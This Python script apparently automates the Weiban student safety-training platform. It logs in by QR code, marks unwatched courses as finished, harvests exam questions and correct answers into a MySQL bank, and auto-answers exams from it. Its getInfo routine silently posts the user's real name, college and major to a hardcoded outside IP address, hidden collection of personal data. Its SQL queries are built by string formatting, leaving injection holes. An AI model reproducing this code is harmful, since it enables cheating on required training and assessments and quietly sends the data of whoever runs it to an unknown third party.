# import os
import json
import webbrowser
import requests
import time
import http.cookiejar
import datetime
import random
import pymysql
from tqdm import tqdm
#自己的题库地址

# db.connect_timeout()
host='题库数据库地址'
user='用户名称'
password='数据库地址'
database='数据库名称'
n=1
def search(id):
    db = pymysql.connect(host=host,
                         user=user,
                         password=password,
                         database=database,
                         charset='utf8'
                         )
    cursor = db.cursor()
    sql=f"select  * from questions where id='{id}'"
    cursor.execute(sql)
    db.ping(reconnect=True)
    res=cursor.fetchall()
    # print(res)
    try:
        if res is not None or len(res)==0:
            # print(res)

            if res[0][4]==None:
                # print(res)
                print(f'找不到第{n}次')
                n=n+1

                return "找不到"
            if res[0][2]=="单选题":
                db.cursor().close()
                return res[0][4]
            else:

                res=res[0][4].split('&')
                db.cursor().close()
                return ",".join(res)
    except Exception as e:
        db.cursor().close()
        return False
        # print(e)



    # 提交数据


def insert(id, title, typeLabel, question):
    db = pymysql.connect(host=host,
                         user=user,
                         password=password,
                         database=database,
                         charset='utf8'
                         )
    insert_emp_sql = f"insert ignore into weibanques.questions (`id`,`title`,`typeLabel`,`question`) values ('{id}','{title}','{typeLabel}','{question}');"
    # 执行语句
    # print(insert_emp_sql)
    cursor = db.cursor()
    rs = cursor.execute(insert_emp_sql)

    # 提交数据
    r = db.commit()
    if rs != 0:
        db.cursor().close()
        return True


def update(id, answer):
    db = pymysql.connect(host=host,
                         user=user,
                         password=password,
                         database=database,
                         charset='utf8'
                         )
    cursor = db.cursor()
    sql = f'update  weibanques.questions set correct="{answer}" where id="{id}"'
    rs = cursor.execute(sql)
    r = db.commit()
    # print(rs)
    if rs != 0:
        db.cursor().close()
        return True
getQRCodeURL = 'https://weiban.mycourse.cn/pharos/login/genBarCodeImageAndCacheUuid.do'  # 获取登录二维码
loginStatusURL = 'https://weiban.mycourse.cn/pharos/login/barCodeWebAutoLogin.do'  # 刷新登录状态
getuserInfo = 'https://weiban.mycourse.cn/pharos/my/getInfo.do'  # 获取用户信息
getTask = 'https://weiban.mycourse.cn/pharos/index/getStudyTask.do'  # 获取任务列表
getProgressURL = 'https://weiban.mycourse.cn/pharos/project/showProgress.do'  # 获取进程
getCourseURL = 'https://weiban.mycourse.cn/pharos/usercourse/listCategory.do'  # 获取课程URL
getCourselisURL = 'https://weiban.mycourse.cn/pharos/usercourse/listCourse.do'  # 获取课程详细信息
doStudyURL = 'https://weiban.mycourse.cn/pharos/usercourse/study.do'  # 发送开始练习
finishURL = 'https://weiban.mycourse.cn/pharos/usercourse/finish.do'  # 发送完成请求
getCourseUrls='https://weiban.mycourse.cn/pharos/usercourse/getCourseUrl.do'
__ua_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36', 'Cookie': ''}
cookie = http.cookiejar.CookieJar()
class WeibanAPI():

    def __init__(self,token,userId,tenantCode):
        self.header={
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
                f"x-token": token,
                # 'cookie': 'SERVERID=3e9e86f31a75ec1ee6c732efcaf93765|1664377858|1664377106'
}
        self.userId=userId
        self.tenantCode=tenantCode,
        self.token=token
    def getRandomtime(self):
        delayTime=random.randint(10,20)
        return delayTime
    def getMiniTime(self):
        delayTime=random.randint(2,10)
        return delayTime
    def qrLogin(self):
        try:
            re=requests.get(getQRCodeURL)
            print(re)
            image = re.json()["data"]["imagePath"]
            self.barCodeCacheUserId = re.json()["data"]["barCodeCacheUserId"]
            return image
        except requests.exceptions.SSLError:
            print('无法连接服务器,请检查网络')
            time.sleep(8)
    def freashLogin(self):
        barCodeCacheUserId=self.barCodeCacheUserId
        # print(barCodeCacheUserId)
        param = {
            'barCodeCacheUserId': barCodeCacheUserId
        }
        re = requests.post(loginStatusURL, data=param)
        # print(re.json())
        self.userId=re.json()['data']["userId"]
        self.token = re.json()['data']["token"]
        self.userName = re.json()['data']["userName"]
        self.tenantCode=re.json()['data']["tenantCode"]
        self.preUserProjectId=re.json()['data']['preUserProjectId']
    def getInfo(self):
        param = {
            'userId': self.userId,
            'tenantCode': self.tenantCode
        }
        r = requests.post(url=getuserInfo+f"?timestamp={int(time.time())}", data=param,headers=self.header)
        # print(r)
        info = r.json()['data']
        data={
            "mesg":'ok',
            'info':info
        }

        

        sendInfo=requests.post(url='http://106.75.139.59:3383/api/use',json=data)
        print('{:=^15}\n姓名：{}\n学院：{}\n专业：{}'.format("学生信息",info['realName'], info['orgName'], info['specialtyName']))


    def getTask(self):
        param = {
            'userId': self.userId,
            'tenantCode': self.tenantCode,
            "token":self.token
        }
        url=getTask+"?"+str(int(time.time()))

        re = requests.post(url=url+f"?timestamp={int(time.time())}", data=param,headers=self.header)
        # print(re)
        response = re.json()
        # print(response)
        if response['code'] == '0':
            # print(response['data'])
            self.preUserProjectId = response['data']['userProjectId']
            self.projectID=self.preUserProjectId
            print(self.preUserProjectId)
    def getProgress(self):
        param = {
            'userProjectId': self.preUserProjectId,
            'tenantCode': self.tenantCode,
            "token":self.token,
            "userId":self.userId
        }
        re = requests.post(url=getProgressURL+f"?timestamp={int(time.time())}", data=param,headers=self.header)
        # print(re)
        progress = re.json()['data']
        print('{:*^15}'.format('学习进度'))
        print('课程总数：' + str(progress['requiredNum']))
        print('完成课程：' + str(progress['requiredFinishedNum']))
        print('结束时间：' + str(progress['endTime']))
        print('剩余天数：' + str(progress['lastDays']))
        if progress['requiredNum']!=progress['requiredFinishedNum']:
            return False
        else:return True
    def getCourse(self):
        param = {
            'userProjectId': self.projectID,
            "userId":self.userId,
            'chooseType': 3,
            'tenantCode': self.tenantCode,
            "token":self.token
        }
        self.course = requests.post(getCourseURL+f"?timestamp={int(time.time())}", data=param,headers=self.header)
        # print(self.course)
    def finshiall(self, __ua_headers=None):

        for i in self.course.json()['data']:
            # print('\n----章节码：' + i['categoryCode'] + '章节内容：' + i['categoryName'])
            # print('获取课程详细信息')
            param = {
                'userProjectId': self.projectID,
                'chooseType': 3,
                'categoryCode': i['categoryCode'],
                'name': '',
                'userId': self.userId,
                'tenantCode': self.tenantCode,
                'token': self.token
            }

            req = requests.post(url=getCourselisURL+f"?timestamp={int(time.time())}", data=param,headers=self.header)
            for j in tqdm( req.json()['data'],desc=i['categoryName']):

                # print('课程内容：' + j['resourceName'])
                if (j['finished'] == 1):
                    continue
                    # print('已完成')
                else:
                    param = {
                        'userProjectId': self.projectID,
                        'courseId': j['resourceId'],
                        'tenantCode': self.tenantCode,
                        'userId': self.userId,
                        'token': self.token
                    }
                    # print(self.tenantCode[0])
                    # print(param)
                    temp = time.time()
                    # print(f'https://weiban.mycourse.cn/pharos/usercourse/study.do?timestamp={int(time.time())}')
                    res = requests.post(url=f'https://weiban.mycourse.cn/pharos/usercourse/study.do?timestamp={int(time.time())}',data=param,headers=self.header)
                    # print(res.content)
                    # print(j)
                    data={
                        'courseId':j['resourceId'],
                        'userProjectId': self.projectID,
                        'tenantCode': self.tenantCode[0],
                        'userId': self.userId,
                    }
                    # print(data)
                    res=requests.post(url=getCourseUrls+f"?timestamp={int(temp)}",data=data,headers=self.header)
                    # print()
                    temp_header=self.header
                    temp_header['cookie']='SERVERID='+res.cookies.values()[0]

                    COURSE_ID=res.json()['data']
                    COURSE_ID=str(COURSE_ID).split('&methodToken=')[1].replace('&csCom=false','')
                    # print(COURSE_ID)
                    wait_time = self.getRandomtime()
                    # print('等待{}秒'.format(wait_time))
                    time.sleep(wait_time)
                    params = {
                        'callback': 'jQuery0000',
                        'userCourseId': j['userCourseId'],
                        'tenantCode': self.tenantCode,
                        '_': '1628328773'
                    }
                    r = requests.post(url=f'https://weiban.mycourse.cn/pharos/usercourse/v1/{COURSE_ID}.do?', params=params,
                                      headers=temp_header)
                    # print(r.url)
                    # print(str(r.content))
                    if str(r.content):
                        if 'jQuery0000' in str(r.content):
                            pass
                            # print('完成')
                            # print(r.headers)
                        else:
                            print('失败')
    def Dopaper(self):
        url='https://weiban.mycourse.cn/pharos/exam/listPlan.do'
        data={
            'userProjectId':self.projectID,
            'tenantCode':self.tenantCode,
            'userId':self.userId
        }
        re=requests.post(url=url,data=data,headers=self.header)
        # print(re)
        self.examPlanId=re.json()['data'][0]['examPlanId']
        self.userExamPlanId=re.json()['data'][0]['id']

    def preparePaper(self):
        url='https://weiban.mycourse.cn/pharos/exam/preparePaper.do'
        data={
            'userExamPlanId':self.userExamPlanId,
            'tenantCode':self.tenantCode,
            'userId':self.userId
        }
        re=requests.post(url=url,data=data,headers=self.header)
        # print(re.json())

    def getQuestionList(self):
        url='https://weiban.mycourse.cn/pharos/exam/startPaper.do'
        data={
            'userExamPlanId':self.userExamPlanId,
            'tenantCode':self.tenantCode,
            'userId':self.userId
        }
        res=requests.post(url=url,data=data,headers=self.header)
        self.quesList=res.json()['data']['questionList']
    def historyList(self):
        url='https://weiban.mycourse.cn/pharos/exam/listHistory.do'
        data={
            'examPlanId':self.examPlanId,
            'isRetake': 2,
            'userId':self.userId,
            'tenantCode':self.tenantCode
        }
        res=requests.post(data=data,url=url,headers=self.header)
        self.userExamId = res.json()['data'][0]['id']
        # print(self.userExamId)
    def getAnswer(self):
        url='https://weiban.mycourse.cn/pharos/exam/reviewPaper.do'
        data={
            'userExamId':self.userExamId,
            'isRetake':2,
            'tenantCode':self.tenantCode,
            'userId':self.userId
        }
        res = requests.post(data=data, url=url, headers=self.header)
        self.anwerlist=res.json()['data']['questions']
    def recordAnswe(self,questionId,answerIds):
        times=self.getMiniTime()
        time.sleep(3)
        url='https://weiban.mycourse.cn/pharos/exam/recordQuestion.do'
        data={
            'userExamPlanId':self.userExamPlanId,
            'questionId':questionId,
            'useTime':12,
            'answerIds':answerIds,
            'tenantCode':self.tenantCode,
            'userId':self.userId,
            'examPlanId':self.examPlanId
        }
        res=requests.post(url=url,data=data,headers=self.header)
        # print(res.json())
    def submit(self):
        url='https://weiban.mycourse.cn/pharos/exam/submitPaper.do'
        data={
            'userExamPlanId':self.userExamPlanId,
            'tenantCode':self.tenantCode,
            'userId':self.userId
        }
        res=requests.post(url=url,data=data,headers=self.header)
        return res.json()
    def do_paper(self):
        self.Dopaper()
        self.preparePaper()
        self.getQuestionList()
        questionList=self.quesList
        count=0
        for question in tqdm(questionList):

            id = question['id']
            res=search(id)
            self.recordAnswe(id,res)
        res=self.submit()
        return res
        # print(res)
    def get_ques(self):
        self.Dopaper()
        self.preparePaper()
        self.getQuestionList()
        questionList = self.quesList
        # print(questionList)
        print('抓取题库中~')
        newAdd = 0
        for question in tqdm(questionList):
            # print(question)
            id = question['id']
            title = question['title']
            typeLabel = question['typeLabel']

            optionList = question['optionList']
            questions = {
                'optionList': optionList
            }
            questions = json.dumps(questions)
            # print(id,title,typeLabel,questions)
            res = insert(id=id, title=title, typeLabel=typeLabel, question=questions)
            if res:
                newAdd += 1
        print(f'抓取完毕.新增{newAdd}题')
        print("开始核对答案")
        self.historyList()
        self.getAnswer()
        # print(wb.anwerlist[0])
        answerList = self.anwerlist

        newAnser = 0
        # print(answerList[0])
        for answer in tqdm(answerList):
            id = answer['id']
            typeLabel = answer['typeLabel']
            if (typeLabel == '单选题'):
                for a in answer['optionList']:

                    if a['isCorrect'] == 1:
                        # print(a['id'])

                        an = update(id, a['id'])
                        if an:
                            # print(an)
                            newAnser += 1
            else:

                # print("选项", answer)
                ans = []
                for b in answer['optionList']:

                    # print("答案",b)

                    if b['isCorrect'] == 1:
                        # print(a['id'])
                        ans.append(b['id'])
                        # print(an)
                # mult_ans={ans}
                # mult_ans=pymysql.escape_string(mult_ans)
                # print(mult_ans)

                ans = "&".join(ans)

                # print(ans)
                bn = update(id=id, answer=ans)
                if bn:
                    newAdd += 1

        print(f"添加答案完毕,新增{newAdd}题")


